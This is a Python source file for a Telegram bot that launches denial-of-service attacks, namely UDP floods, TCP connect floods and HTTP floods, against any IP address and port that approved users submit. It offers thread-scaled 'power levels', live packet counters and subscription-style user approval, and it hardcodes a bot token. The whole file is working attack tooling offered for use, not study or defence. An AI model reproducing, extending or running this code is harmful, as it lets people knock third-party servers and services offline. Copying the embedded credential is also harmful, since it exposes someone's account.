# ddos_final_working.py
import asyncio
import logging
import threading
import time
import random
import socket
import re
import os
import json
from datetime import datetime, timedelta
import requests
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application,
    CommandHandler,
    CallbackQueryHandler,
    MessageHandler,
    filters,
    ContextTypes
)

# ---------- CONFIG ----------
BOT_TOKEN = "8278228198:AAG7C97c7R50_gsykoqBMwesCuoRZTciCLA"
ADMIN_IDS = [8210011971]   # Apni ID daalein

BLOCKED_PORTS = {22, 25, 443, 3389, 8700, 9031, 17500, 20000, 20001}
THREADS_LEVEL = {i: i * 100 for i in range(1, 16)}  # 15x = 1500 threads
SOCKETS_PER_THREAD = 10
DELAY = 0.00005
HTTP_THREADS = 500

POWER_LEVEL = 10
attack_running = False
current_attack = {
    'ip': None, 'port': None, 'method': None, 'duration': 0,
    'start_time': 0, 'packets': 0, 'message_id': None
}
attack_lock = threading.Lock()
user_data = {}

# ---------- Simple JSON DB ----------
USERS_FILE = "users.json"
def load_users():
    if os.path.exists(USERS_FILE):
        with open(USERS_FILE, 'r') as f:
            return json.load(f)
    return {}
def save_users(users):
    with open(USERS_FILE, 'w') as f:
        json.dump(users, f)
def get_user(user_id):
    return load_users().get(str(user_id))
def create_user(user_id, username=""):
    users = load_users()
    if str(user_id) not in users:
        users[str(user_id)] = {"approved": False, "expires": None, "total_attacks": 0}
        save_users(users)
    return users[str(user_id)]
def approve_user(user_id, days):
    users = load_users()
    if str(user_id) in users:
        users[str(user_id)]["approved"] = True
        users[str(user_id)]["expires"] = (datetime.now() + timedelta(days=days)).isoformat()
        save_users(users)
        return True
    return False
def is_user_approved(user_id):
    user = load_users().get(str(user_id))
    if not user or not user.get("approved"):
        return False
    expires = user.get("expires")
    if expires and datetime.fromisoformat(expires) < datetime.now():
        return False
    return True

def get_blocked_ports_list():
    return ", ".join(str(p) for p in sorted(BLOCKED_PORTS))

# ---------- ATTACK ENGINES (15x power) ----------
def udp_flood(ip, port, duration):
    global attack_running, current_attack
    end = time.time() + duration
    port = int(port)
    socks = []
    for _ in range(SOCKETS_PER_THREAD):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            socks.append(s)
        except:
            pass
    payload = random._urandom(512)
    while time.time() < end and attack_running:
        for sock in socks:
            try:
                sock.sendto(payload, (ip, port))
                with attack_lock:
                    current_attack['packets'] += 1
            except:
                pass
        time.sleep(DELAY)
    for sock in socks:
        sock.close()

def tcp_syn_flood(ip, port, duration):
    global attack_running, current_attack
    end = time.time() + duration
    port = int(port)
    while time.time() < end and attack_running:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.1)
            sock.connect_ex((ip, port))
            sock.close()
            with attack_lock:
                current_attack['packets'] += 1
            time.sleep(0.0005)
        except:
            time.sleep(0.01)

def http_flood(target_url, duration):
    global attack_running, current_attack
    end = time.time() + duration
    session = requests.Session()
    headers = {'User-Agent': 'Mozilla/5.0'}
    while time.time() < end and attack_running:
        try:
            session.get(target_url, headers=headers, timeout=2)
            with attack_lock:
                current_attack['packets'] += 1
            time.sleep(0.001)
        except:
            time.sleep(0.01)
    session.close()

# ---------- Attack Launcher with Monitoring ----------
def launch_attack(ip, port, duration, method, send_func):
    global attack_running, current_attack

    attack_running = True
    with attack_lock:
        current_attack = {
            'ip': ip, 'port': port, 'method': method, 'duration': duration,
            'start_time': time.time(), 'packets': 0, 'message_id': None
        }

    # Select method
    if method == 'udp':
        num_threads = THREADS_LEVEL[POWER_LEVEL]
        target = udp_flood
        args = (ip, port, duration)
    elif method == 'tcp':
        num_threads = THREADS_LEVEL[POWER_LEVEL]
        target = tcp_syn_flood
        args = (ip, port, duration)
    else:  # http
        num_threads = HTTP_THREADS
        url = f"http://{ip}:{port}" if port != 443 else f"https://{ip}:{port}"
        target = http_flood
        args = (url, duration)

    # Start threads
    for _ in range(num_threads):
        t = threading.Thread(target=target, args=args, daemon=True)
        t.start()

    # Monitor progress
    start_time = time.time()
    last_update = 0
    keyboard = [
        [InlineKeyboardButton("🛑 STOP", callback_data="stop_attack")],
        [InlineKeyboardButton("ℹ️ INFO", callback_data="info_attack"), InlineKeyboardButton("🔄 REFRESH", callback_data="refresh_attack")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)

    while attack_running and (time.time() - start_time) < duration:
        time.sleep(1)
        elapsed = int(time.time() - start_time)
        if time.time() - last_update >= 2:
            last_update = time.time()
            with attack_lock:
                pkt = current_attack['packets']
            progress = int((elapsed / duration) * 20)
            bar = "█" * progress + "░" * (20 - progress)
            speed = int(pkt / elapsed) if elapsed else 0
            text = (
                f"💥 *ATTACK IN PROGRESS* 💥\n\n"
                f"🎯 `{ip}:{port}`\n"
                f"⚙️ Method: `{method.upper()}`\n"
                f"📦 Packets: `{pkt:,}`\n"
                f"⏱️ Time: `{elapsed}/{duration}s`\n"
                f"📊 `[{bar}]`\n"
                f"💥 Speed: `{speed:,}` pps\n"
                f"🧵 Threads: `{num_threads}`"
            )
            try:
                send_func(text, reply_markup, edit=True, msg_id=current_attack['message_id'])
            except:
                pass

    attack_running = False
    with attack_lock:
        pkt = current_attack['packets']
    avg_speed = int(pkt / duration) if duration else 0
    text = f"✅ *ATTACK COMPLETED* ✅\n\n📦 Total packets: `{pkt:,}`\n💥 Avg speed: `{avg_speed:,}` pps"
    try:
        send_func(text, None, edit=True, msg_id=current_attack['message_id'])
    except:
        pass

# ---------- TELEGRAM HANDLERS ----------
async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    username = update.effective_user.username
    create_user(user_id, username)

    if user_id in ADMIN_IDS and not is_user_approved(user_id):
        approve_user(user_id, 365)
        await update.message.reply_text("✅ Admin auto-approved.")

    if is_user_approved(user_id):
        user_data[user_id] = {'step': 'ip'}
        await update.message.reply_text(
            "⚡ *DDoS Bot (15x Power)* ⚡\n\n"
            "Send target *IP address*:\nExample: `192.168.1.1`\n\n"
            f"Current power: `{POWER_LEVEL}x` (max 15x)\n"
            f"Use `/power 1-15` to change",
            parse_mode='Markdown'
        )
    else:
        await update.message.reply_text("❌ Access Denied. Contact admin.")

async def power_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global POWER_LEVEL
    if update.effective_user.id not in ADMIN_IDS:
        await update.message.reply_text("❌ Unauthorized")
        return
    if not context.args:
        await update.message.reply_text(f"Current power: `{POWER_LEVEL}x` (1-15)", parse_mode='Markdown')
        return
    try:
        level = int(context.args[0])
        if 1 <= level <= 15:
            POWER_LEVEL = level
            await update.message.reply_text(f"✅ Power set to `{level}x` → threads: {THREADS_LEVEL[level]}")
        else:
            await update.message.reply_text("❌ Use 1-15")
    except:
        await update.message.reply_text("❌ Invalid number")

async def stop_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global attack_running
    if update.effective_user.id not in ADMIN_IDS:
        await update.message.reply_text("❌ Unauthorized")
        return
    attack_running = False
    await update.message.reply_text("🛑 Attack stopped by command")

async def myinfo_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    user = get_user(user_id)
    if not user:
        await update.message.reply_text("Use /start first")
        return
    status = "✅ Approved" if user.get("approved") else "❌ Not approved"
    await update.message.reply_text(f"📋 *Your Account*\n\n🆔 `{user_id}`\n📊 {status}", parse_mode='Markdown')

async def blocked_ports_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(f"🚫 *Blocked Ports*\n\n{get_blocked_ports_list()}", parse_mode='Markdown')

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    msg = (
        "🤖 *Commands*\n"
        "/start – Setup attack\n"
        "/power 1-15 – Set threads\n"
        "/stop – Emergency stop\n"
        "/myinfo – Account info\n"
        "/blockedports – Show blocked\n"
        "/help – This menu"
    )
    await update.message.reply_text(msg, parse_mode='Markdown')

# ---------- Interactive Message Handler (with buttons) ----------
async def handle_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_user_approved(user_id):
        await update.message.reply_text("❌ Not approved")
        return

    step_data = user_data.get(user_id, {})
    step = step_data.get('step')
    text = update.message.text.strip()

    if step == 'ip':
        if not re.match(r'^(\d{1,3}\.){3}\d{1,3}$', text):
            await update.message.reply_text("❌ Invalid IP. Send again:")
            return
        step_data['ip'] = text
        step_data['step'] = 'port'
        user_data[user_id] = step_data
        await update.message.reply_text(f"🔌 Send *port* (1-65535):\n🚫 Blocked: {get_blocked_ports_list()}", parse_mode='Markdown')
    elif step == 'port':
        try:
            port = int(text)
            if port < 1 or port > 65535 or port in BLOCKED_PORTS:
                await update.message.reply_text("❌ Invalid or blocked port")
                return
            step_data['port'] = port
            step_data['step'] = 'method'
            user_data[user_id] = step_data
            # Show method selection buttons
            keyboard = [
                [InlineKeyboardButton("🔥 TCP (SYN Flood)", callback_data="method_tcp")],
                [InlineKeyboardButton("💣 UDP Flood", callback_data="method_udp")],
                [InlineKeyboardButton("🌐 HTTP Flood", callback_data="method_http")],
                [InlineKeyboardButton("❌ Cancel", callback_data="cancel_setup")]
            ]
            await update.message.reply_text("⚡ Select attack method:", reply_markup=InlineKeyboardMarkup(keyboard))
        except:
            await update.message.reply_text("❌ Send a number")
    elif step == 'duration':
        try:
            duration = int(text)
            if duration < 5 or duration > 300:
                await update.message.reply_text("❌ Duration 5-300 seconds")
                return
            ip = step_data['ip']
            port = step_data['port']
            method = step_data.get('method', 'tcp')
            step_data['final'] = (ip, port, duration, method)
            step_data['step'] = 'confirm'
            user_data[user_id] = step_data
            keyboard = [
                [InlineKeyboardButton("✅ START ATTACK", callback_data="confirm_start")],
                [InlineKeyboardButton("❌ Cancel", callback_data="cancel_setup")]
            ]
            await update.message.reply_text(
                f"🔥 *Confirm Attack*\n\n"
                f"🎯 `{ip}:{port}`\n"
                f"⚙️ Method: `{method.upper()}`\n"
                f"⏱️ Duration: `{duration}s`\n"
                f"💪 Power: `{POWER_LEVEL}x` ({THREADS_LEVEL[POWER_LEVEL]} threads)\n\n"
                f"Start?",
                parse_mode='Markdown',
                reply_markup=InlineKeyboardMarkup(keyboard)
            )
        except:
            await update.message.reply_text("❌ Send number")
    else:
        await update.message.reply_text("Send /start to begin")

async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    user_id = query.from_user.id
    data = query.data

    if data == "cancel_setup":
        if user_id in user_data:
            del user_data[user_id]
        await query.edit_message_text("❌ Setup cancelled")
        return

    if data.startswith("method_"):
        method = data.split("_")[1]
        if user_id not in user_data:
            user_data[user_id] = {}
        user_data[user_id]['method'] = method
        user_data[user_id]['step'] = 'duration'
        await query.edit_message_text(f"✅ Method selected: `{method.upper()}`\n⏱️ Send duration (5-300s):", parse_mode='Markdown')
        return

    if data == "confirm_start":
        if user_id not in user_data or 'final' not in user_data[user_id]:
            await query.edit_message_text("❌ Session expired. Use /start")
            return
        ip, port, duration, method = user_data[user_id]['final']
        del user_data[user_id]

        # Function to send updates from attack thread
        loop = asyncio.get_event_loop()
        def send_update(text, reply_markup=None, edit=False, msg_id=None):
            if edit and msg_id:
                coro = query.message.reply_text(text, parse_mode='Markdown', reply_markup=reply_markup)
            else:
                coro = query.message.reply_text(text, parse_mode='Markdown', reply_markup=reply_markup)
            future = asyncio.run_coroutine_threadsafe(coro, loop)
            return future.result()

        threading.Thread(target=launch_attack, args=(ip, port, duration, method, send_update), daemon=True).start()
        await query.edit_message_text("🚀 Attack launching... use /stop if needed")
        return

    # Attack control buttons (during attack)
    global attack_running, current_attack
    if data == "stop_attack":
        attack_running = False
        await query.edit_message_text("🛑 Attack stopped by user")
    elif data == "info_attack":
        if attack_running:
            with attack_lock:
                pkt = current_attack['packets']
                elapsed = int(time.time() - current_attack['start_time'])
                remaining = current_attack['duration'] - elapsed
                speed = int(pkt / elapsed) if elapsed else 0
                text = (
                    f"ℹ️ *Attack Info*\n\n"
                    f"🎯 `{current_attack['ip']}:{current_attack['port']}`\n"
                    f"📦 Packets: `{pkt:,}`\n"
                    f"⏱️ Remaining: `{remaining}s`\n"
                    f"💥 Speed: `{speed:,}` pps\n"
                    f"🔋 Power: `{POWER_LEVEL}x`"
                )
                await query.edit_message_text(text, parse_mode='Markdown')
        else:
            await query.edit_message_text("ℹ️ No active attack")
    elif data == "refresh_attack":
        if attack_running:
            with attack_lock:
                pkt = current_attack['packets']
                elapsed = int(time.time() - current_attack['start_time'])
                remaining = current_attack['duration'] - elapsed
                progress = int((elapsed / current_attack['duration']) * 20)
                bar = "█" * progress + "░" * (20 - progress)
                speed = int(pkt / elapsed) if elapsed else 0
                text = (
                    f"💥 *ATTACK LIVE* 💥\n\n"
                    f"🎯 `{current_attack['ip']}:{current_attack['port']}`\n"
                    f"📦 `{pkt:,}` pkts\n"
                    f"⏱️ `{elapsed}/{current_attack['duration']}s`\n"
                    f"📊 `[{bar}]`\n"
                    f"💥 `{speed:,}` pps"
                )
                keyboard = [
                    [InlineKeyboardButton("🛑 STOP", callback_data="stop_attack")],
                    [InlineKeyboardButton("ℹ️ INFO", callback_data="info_attack"), InlineKeyboardButton("🔄 REFRESH", callback_data="refresh_attack")]
                ]
                await query.edit_message_text(text, parse_mode='Markdown', reply_markup=InlineKeyboardMarkup(keyboard))
        else:
            await query.edit_message_text("✅ No attack running")
    elif data == "cancel_attack":
        if user_id in user_data:
            del user_data[user_id]
        await query.edit_message_text("❌ Cancelled")

async def error_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    logging.error(f"Update {update} caused error {context.error}")

# ---------- MAIN ----------
def main():
    print("💥 15x DDoS Bot Starting...")
    print(f"Admins: {ADMIN_IDS}")
    app = Application.builder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", start_command))
    app.add_handler(CommandHandler("power", power_command))
    app.add_handler(CommandHandler("stop", stop_command))
    app.add_handler(CommandHandler("myinfo", myinfo_command))
    app.add_handler(CommandHandler("blockedports", blocked_ports_command))
    app.add_handler(CommandHandler("help", help_command))
    app.add_handler(CallbackQueryHandler(button_callback))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_text))
    app.add_error_handler(error_handler)
    print("✅ Bot is LIVE! Send /start")
    app.run_polling(allowed_updates=Update.ALL_TYPES)

if __name__ == "__main__":
    main()
